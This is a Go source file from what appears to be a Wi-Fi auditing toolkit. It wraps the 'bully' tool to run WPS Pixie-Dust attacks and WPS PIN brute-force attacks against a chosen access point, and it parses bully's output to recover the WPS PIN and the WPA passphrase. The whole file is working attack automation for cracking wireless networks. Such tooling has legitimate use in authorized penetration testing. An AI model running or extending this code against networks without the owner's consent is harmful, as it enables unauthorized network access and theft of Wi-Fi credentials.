package tools

import (
	"context"
	"fmt"
	"regexp"
	"strings"
)

var (
	bullyPINRe = regexp.MustCompile(`Pin is (\d+)`)
	bullyPSKRe = regexp.MustCompile(`pass(?:phrase|word):\s*(.+)`)
)

// Bully wraps the bully binary as an alternative WPS tool.
type Bully struct {
	tool *ExternalTool
}

func NewBully() *Bully {
	return &Bully{
		tool: &ExternalTool{Name: "bully", Required: false},
	}
}

func (b *Bully) Available() bool {
	return b.tool.Exists()
}

// PixieDust runs a Pixie-Dust attack using bully.
func (b *Bully) PixieDust(ctx context.Context, iface, bssid string, channel int) (*WPSResult, error) {
	args := []string{
		"-b", bssid,
		"-c", fmt.Sprintf("%d", channel),
		"-d",  // Pixie-Dust
		"-v3", // Verbose
		iface,
	}

	out, err := RunCapture(ctx, "bully", args...)
	if err != nil && !strings.Contains(out, "Pin is") {
		return nil, fmt.Errorf("bully pixie-dust failed: %w", err)
	}

	result := &WPSResult{}
	if match := bullyPINRe.FindStringSubmatch(out); len(match) > 1 {
		result.PIN = match[1]
	}
	if match := bullyPSKRe.FindStringSubmatch(out); len(match) > 1 {
		result.PSK = strings.TrimSpace(match[1])
	}

	if result.PIN == "" {
		return nil, fmt.Errorf("bully: no PIN recovered")
	}

	return result, nil
}

// RetrievePSK uses a known PIN to get the WPA PSK.
func (b *Bully) RetrievePSK(ctx context.Context, iface, bssid string, channel int, pin string) (string, error) {
	args := []string{
		"-b", bssid,
		"-c", fmt.Sprintf("%d", channel),
		"-p", pin,
		"-v3",
		iface,
	}

	out, err := RunCapture(ctx, "bully", args...)
	if err != nil {
		return "", err
	}

	if match := bullyPSKRe.FindStringSubmatch(out); len(match) > 1 {
		return strings.TrimSpace(match[1]), nil
	}

	return "", fmt.Errorf("could not retrieve PSK with PIN %s", pin)
}

// PINBruteForce starts a WPS PIN brute-force with bully.
func (b *Bully) PINBruteForce(ctx context.Context, iface, bssid string, channel int) (*Process, error) {
	return StartProcess(ctx, "bully",
		"-b", bssid,
		"-c", fmt.Sprintf("%d", channel),
		"-v3",
		iface,
	)
}
